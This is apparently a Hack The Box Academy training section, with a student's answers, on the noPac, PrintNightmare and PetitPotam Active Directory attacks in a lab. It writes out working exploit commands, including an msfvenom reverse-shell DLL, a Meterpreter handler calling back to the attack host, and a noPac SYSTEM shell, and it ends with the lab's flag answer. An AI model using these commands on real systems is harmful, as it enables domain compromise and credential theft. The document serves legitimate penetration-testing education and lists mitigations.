# Bleeding Edge Vulnerabilities

When it comes to patch management and cycles, many organizations are not quick to roll out patches through their networks. Because of this, we may be able to achieve a quick win either for initial access or domain privilege escalation using a very recent tactic. At the time of writing (April 2022), the three techniques shown in this section are relatively recent (within the last 6-9 months). These are advanced topics that can not be covered thoroughly in one module section. The purpose of demonstrating these attacks is to allow students to try out the latest and greatest attacks in a controlled lab environment and present topics that will be covered in extreme depth in more advanced Active Directory modules. As with any attack, if you do not understand how these work or the risk they could pose to a production environment, it would be best not to attempt them during a real-world client engagement. That being said, these techniques could be considered "safe" and less destructive than attacks such as [Zerologon](https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/) or [DCShadow](https://stealthbits.com/blog/what-is-a-dcshadow-attack-and-how-to-defend-against-it/). Still, we should always exercise caution, take detailed notes, and communicate with our clients. All attacks come with a risk. For example, the `PrintNightmare` attack could potentially crash the print spooler service on a remote host and cause a service disruption.

As information security practitioners in a rapidly changing and evolving field, we must keep ourselves sharp and on top of recent attacks and new tools and techniques. We recommend trying out all of the techniques in this section and doing additional research to find other methods for performing these attacks. Now, let's dive in.

***

### Scenario Setup

In this section, we will perform all examples from a Linux attack host. You can spawn the hosts for this section at the end of this section and SSH into the ATTACK01 Linux attack host. For the portion of this section that demonstrates interaction from a Windows host (using Rubeus and Mimikatz), you could spawn the MS01 attack host in the previous or next section and use the base64 certificate blob obtained using `ntlmrelayx.py` and `petitpotam.py` to perform the same pass-the-ticket attack using Rubeus as demonstrated near the end of this section.

### NoPac (SamAccountName Spoofing)

A great example of an emerging threat is the [Sam\_The\_Admin vulnerability](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699), also called `noPac` or referred to as `SamAccountName Spoofing` released at the end of 2021. This vulnerability encompasses two CVEs [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287), allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command. Here is a quick breakdown of what each CVE provides regarding this vulnerability.

| 42278                                                                      | 42287                                                                                         |
| -------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------- |
| `42278` is a bypass vulnerability with the Security Account Manager (SAM). | `42287` is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS. |

This exploit path takes advantage of being able to change the `SamAccountName` of a computer account to that of a Domain Controller. By default, authenticated users can add up to [ten computers to a domain](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/add-workstations-to-domain). When doing so, we change the name of the new host to match a Domain Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller. The flow of the attack is outlined in detail in this [blog post](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware).

We can use this [tool](https://github.com/Ridter/noPac) to perform this attack. This tool is present on the ATTACK01 host in `/opt/noPac`.

NoPac uses many tools in Impacket to communicate with, upload a payload, and issue commands from the attack host to the target DC. Before attempting to use the exploit, we should ensure Impacket is installed and the noPac exploit repo is cloned to our attack host if needed. We can use these commands to do so:

**Ensuring Impacket is Installed**

Bleeding Edge Vulnerabilities

```shell-session
AIceBear@htb[/htb]$ git clone https://github.com/SecureAuthCorp/impacket.git
```

Bleeding Edge Vulnerabilities

```shell-session
AIceBear@htb[/htb]$ python setup.py install 
```

**Cloning the NoPac Exploit Repo**

Bleeding Edge Vulnerabilities

```shell-session
AIceBear@htb[/htb]$ git clone https://github.com/Ridter/noPac.git
```

Once Impacket is installed and we ensure the repo is cloned to our attack box, we can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner (`scanner.py`) then use the exploit (`noPac.py`) to gain a shell as `NT AUTHORITY/SYSTEM`. We can use the scanner with a standard domain user account to attempt to obtain a TGT from the target Domain Controller. If successful, this indicates the system is, in fact, vulnerable. We'll also notice the `ms-DS-MachineAccountQuota` number is set to 10. In some environments, an astute sysadmin may set the `ms-DS-MachineAccountQuota` value to 0. If this is the case, the attack will fail because our user will not have the rights to add a new machine account. Setting this to `0` can prevent quite a few AD attacks.

**Scanning for NoPac**

Bleeding Edge Vulnerabilities

```shell-session
AIceBear@htb[/htb]$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663
```

There are many different ways to use NoPac to further our access. One way is to obtain a shell with SYSTEM level privileges. We can do this by running noPac.py with the syntax below to impersonate the built-in administrator account and drop into a semi-interactive shell session on the target Domain Controller. This could be "noisy" or may be blocked by AV or EDR.

**Running NoPac & Getting a Shell**

[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..

```

We will notice that a `semi-interactive shell session` is established with the target using [smbexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py). Keep in mind with smbexec shells we will need to use exact paths instead of navigating the directory structure using `cd`.

It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run. We can use `ls` to confirm.

**Confirming the Location of Saved Tickets**

Bleeding Edge Vulnerabilities

```shell-session
AIceBear@htb[/htb]$ ls

administrator_DC01.INLANEFREIGHT.local.ccache  noPac.py   requirements.txt  utils
README.md  scanner.py
```

We could then use the ccache file to perform a pass-the-ticket and perform further attacks such as DCSync. We can also use the tool with the `-dump` flag to perform a DCSync using secretsdump.py. This method would still create a ccache file on disk, which we would want to be aware of and clean up.

**Using noPac to DCSync the Built-in Administrator Account**

### Windows Defender & SMBEXEC.py Considerations

If Windows Defender (or another AV or EDR product) is enabled on a target, our shell session may be established, but issuing any commands will likely fail. The first thing smbexec.py does is create a service called `BTOBTO`. Another service called `BTOBO` is created, and any command we type is sent to the target over SMB inside a .bat file called `execute.bat`. With each new command we type, a new batch script is created and echoed to a temporary file that executes said script and deletes it from the system. Let's look at a Windows Defender log to see what behavior was considered malicious.

**Windows Defender Quarantine Log**

![image](https://academy.hackthebox.com/storage/modules/143/defenderLog.png)

If opsec or being "quiet" is a consideration during an assessment, we would most likely want to avoid a tool like smbexec.py. The focus of this module is on tactics and techniques. We will refine our methodology as we progress in more advanced modules, but we first must obtain a solid base in enumerating and attacking Active Directory.

***

### PrintNightmare

`PrintNightmare` is the nickname given to two vulnerabilities ([CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)) found in the [Print Spooler service](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc) that runs on all Windows operating systems. Many exploits have been written based on these vulnerabilities that allow for privilege escalation and remote code execution. Using this vulnerability for local privilege escalation is covered in the [Windows Privilege Escalation](https://academy.hackthebox.com/course/preview/windows-privilege-escalation) module, but is also important to practice within the context of Active Directory environments for gaining remote access to a host. Let's practice with one exploit that can allow us to gain a SYSTEM shell session on a Domain Controller running on a Windows Server 2019 host.

Before conducting this attack, we must retrieve the exploit we will use. In this case, we will be using [cube0x0's](https://twitter.com/cube0x0?lang=en) exploit. We can use Git to clone it to our attack host:

**Cloning the Exploit**

Bleeding Edge Vulnerabilities

```shell-session
AIceBear@htb[/htb]$ git clone https://github.com/cube0x0/CVE-2021-1675.git
```

For this exploit to work successfully, we will need to use cube0x0's version of Impacket. We may need to uninstall the version of Impacket on our attack host and install cube0x0's (this is already installed on ATTACK01 in the lab). We can use the commands below to accomplish this:

**Install cube0x0's Version of Impacket**

Bleeding Edge Vulnerabilities

```shell-session
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

We can use `rpcdump.py` to see if `Print System Asynchronous Protocol` and `Print System Remote Protocol` are exposed on the target.

**Enumerating for MS-RPRN**

Bleeding Edge Vulnerabilities

```shell-session
AIceBear@htb[/htb]$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol 
```

After confirming this, we can proceed with attempting to use the exploit. We can begin by crafting a DLL payload using `msfvenom`.

**Generating a DLL Payload**

Bleeding Edge Vulnerabilities

```shell-session
AIceBear@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 8704 bytes
```

We will then host this payload in an SMB share we create on our attack host using `smbserver.py`.

**Creating a Share with smbserver.py**

Bleeding Edge Vulnerabilities

```shell-session
AIceBear@htb[/htb]$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

```

Once the share is created and hosting our payload, we can use MSF to configure & start a multi handler responsible for catching the reverse shell that gets executed on the target.

**Configuring & Starting MSF multi/handler**

Bleeding Edge Vulnerabilities

```shell-session
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225
LHOST => 10.3.88.114
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
LPORT => 8080
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 172.16.5.225:8080 
```

With the share hosting our payload and our multi handler listening for a connection, we can attempt to run the exploit against the target. The command below is how we use the exploit:

**Running the Exploit**

Bleeding Edge Vulnerabilities

```shell-session
AIceBear@htb[/htb]$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'

[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0

<SNIP>
```

Notice how at the end of the command, we include the path to the share hosting our payload (`\\<ip address of attack host>\ShareName\nameofpayload.dll`). If all goes well after running the exploit, the target will access the share and execute the payload. The payload will then call back to our multi handler giving us an elevated SYSTEM shell.

**Getting the SYSTEM Shell**

Bleeding Edge Vulnerabilities

```shell-session
[*] Sending stage (200262 bytes) to 172.16.5.5
[*] Meterpreter session 1 opened (172.16.5.225:8080 -> 172.16.5.5:58048 ) at 2022-03-29 13:06:20 -0400

```

Once the exploit has been run, we will notice that a Meterpreter session has been started. We can then drop into a SYSTEM shell and see that we have NT AUTHORITY\SYSTEM privileges on the target Domain Controller starting from just a standard domain user account.

### PetitPotam (MS-EFSRPC)

PetitPotam ([CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)) is an LSA spoofing vulnerability that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the [Local Security Authority Remote Protocol (LSARPC)](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc) by abusing Microsoft’s [Encrypting File System Remote Protocol (MS-EFSRPC)](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31). This technique allows an unauthenticated attacker to take over a Windows domain where [Active Directory Certificate Services (AD CS)](https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs) is in use. In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate. This certificate can then be used with a tool such as `Rubeus` or `gettgtpkinit.py` from [PKINITtools](https://github.com/dirkjanm/PKINITtools) to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.

[This](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/) blog post goes into more detail on NTLM relaying to AD CS and the PetitPotam attack.

Let's walk through the attack. First off, we need to start `ntlmrelayx.py` in one window on our attack host, specifying the Web Enrollment URL for the CA host and using either the KerberosAuthentication or DomainController AD CS template. If we didn't know the location of the CA, we could use a tool such as [certi](https://github.com/zer1t0/certi) to attempt to locate it.

**Starting ntlmrelayx.py**

In another window, we can run the tool [PetitPotam.py](https://github.com/topotam/PetitPotam). We run this tool with the command `python3 PetitPotam.py <attack host IP> <Domain Controller IP>` to attempt to coerce the Domain Controller to authenticate to our host where ntlmrelayx.py is running.

There is an executable version of this tool that can be run from a Windows host. The authentication trigger has also been added to Mimikatz and can be run as follows using the encrypting file system (EFS) module: `misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>`. There is also a PowerShell implementation of the tool [Invoke-PetitPotam.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1).

Here we run the tool and attempt to coerce authentication via the [EfsRpcOpenFileRaw](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8) method.

**Requesting a TGT Using gettgtpkinit.py**

Next, we can take this base64 certificate and use `gettgtpkinit.py` to request a Ticket-Granting-Ticket (TGT) for the domain controller.

**Setting the KRB5CCNAME Environment Variable**

The TGT requested above was saved down to the `dc01.ccache` file, which we use to set the KRB5CCNAME environment variable, so our attack host uses this file for Kerberos authentication attempts.

```shell-session
AIceBear@htb[/htb]$ export KRB5CCNAME=dc01.ccache
```

**Using Domain Controller TGT to DCSync**

We can then use this TGT with `secretsdump.py` to perform a DCSYnc and retrieve one or all of the NTLM password hashes for the domain.

We could also use a more straightforward command: `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` because the tool will retrieve the username from the ccache file. We can see this by typing `klist` (using the `klist` command requires installation of the [krb5-user](https://packages.ubuntu.com/focal/krb5-user) package on our attack host. This is installed on ATTACK01 in the lab already).

```

**Confirming Admin Access to the Domain Controller**

Finally, we could use the NT hash for the built-in Administrator account to authenticate to the Domain Controller. From here, we have complete control over the domain and could look to establish persistence, search for sensitive data, look for other misconfigurations and vulnerabilities for our report, or begin enumerating trust relationships.

```

**Submitting a TGS Request for Ourselves Using getnthash.py**

We can also take an alternate route once we have the TGT for our target. Using the tool `getnthash.py` from PKINITtools we could request the NT hash for our target host/user by using Kerberos U2U to submit a TGS request with the [Privileged Attribute Certificate (PAC)](https://stealthbits.com/blog/what-is-the-kerberos-pac/) which contains the NT hash for the target. This can be decrypted with the AS-REP encryption key we obtained when requesting the TGT earlier.

Alternatively, once we obtain the base64 certificate via ntlmrelayx.py, we could use the certificate with the Rubeus tool on a Windows attack host to request a TGT ticket and perform a pass-the-ticket (PTT) attack all at once.

Note: We would need to use the `MS01` attack host in another section, such as the `ACL Abuse Tactics` or `Privileged Access` section once we have the base64 certificate saved down to our notes to perform this using Rubeus.

Again, since Domain Controllers have replication privileges in the domain, we can use the pass-the-ticket to perform a DCSync attack using Mimikatz from our Windows attack host. Here, we grab the NT hash for the KRBTGT account, which could be used to create a Golden Ticket and establish persistence. We could obtain the NT hash for any privileged user using DCSync and move forward to the next phase of our assessment.

### PetitPotam Mitigations

First off, the patch for [CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942) should be applied to any affected hosts. Below are some further hardening steps that can be taken:

* To prevent NTLM relay attacks, use [Extended Protection for Authentication](https://docs.microsoft.com/en-us/security-updates/securityadvisories/2009/973811) along with enabling [Require SSL](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429) to only allow HTTPS connections for the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services
* [Disabling NTLM authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain) for Domain Controllers
* Disabling NTLM on AD CS servers using [Group Policy](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-incoming-ntlm-traffic)
* Disabling NTLM for IIS on AD CS servers where the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services are in use

For more reading on attacking Active Directory Certificate Services, I highly recommend the whitepaper [Certified Pre-Owned](https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf) as this demonstrates attacks against AD CS that can be performed using authenticated API calls. This shows that just applying the CVE-2021-36942 patch alone to mitigate PetitPotam is not enough for most organizations running AD CS, because an attacker with standard domain user credentials can still perform attacks against AD CS in many instances. The whitepaper also details other hardening and detection steps that can be taken to harden AD CS.

### Recap

In this section we covered three recent attacks:

* NoPac (SamAccountName Spoofing)
* PrintNightmare (remotely)
* PetitPotam (MS-EFSRPC)

Each of these attacks can be performed with either standard domain user access (NoPac and PrintNightmare) or without any type of authentication to the domain at all (PetitPotam), and can lead to domain compromise relatively easily. There are multiple ways to perform each attack, and we covered a few. Active Directory attacks continue to evolve, and these are surely not the last extremely high-impact attack vectors that we will see. When these types of attacks are released, we should strive to build a small lab environment to practice them in, so we are ready to use them safely and effectively in a real-world engagement should the opportunity arise. Understanding how to set up these attacks in a lab can also significantly increase our understanding of the issue and help us to better advise our clients on the impact, remediation, and detections. This was just a tiny glimpse into the world of attacking AD CS, which could be an entire module.

In the next section, we'll talk through various other issues that we see from time to time in Active Directory environments that could help us further our access or lead to additional findings for our final client report.

## **Questions**

Which two CVEs indicate NoPac.py may work? (Format: ####-#####\&####-#####, no spaces)

```bash
#NoPac (SamAccountName Spoofing)
2021-42278&2021-42287
```

Apply what was taught in this section to gain a shell on DC01. Submit the contents of flag.txt located in the DailyTasks directory on the Administrator's desktop.

(in the lesson above it tells us the nopac tool, and the attack script is located in /opt/noPac so we navigate to that directory then run it)

```bash
ssh htb-student@10.129.142.68
cd /opt/noPac/
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
type \Users\Administrator\Desktop\DailyTasks\flag.txt
D0ntSl@ckonN0P@c!
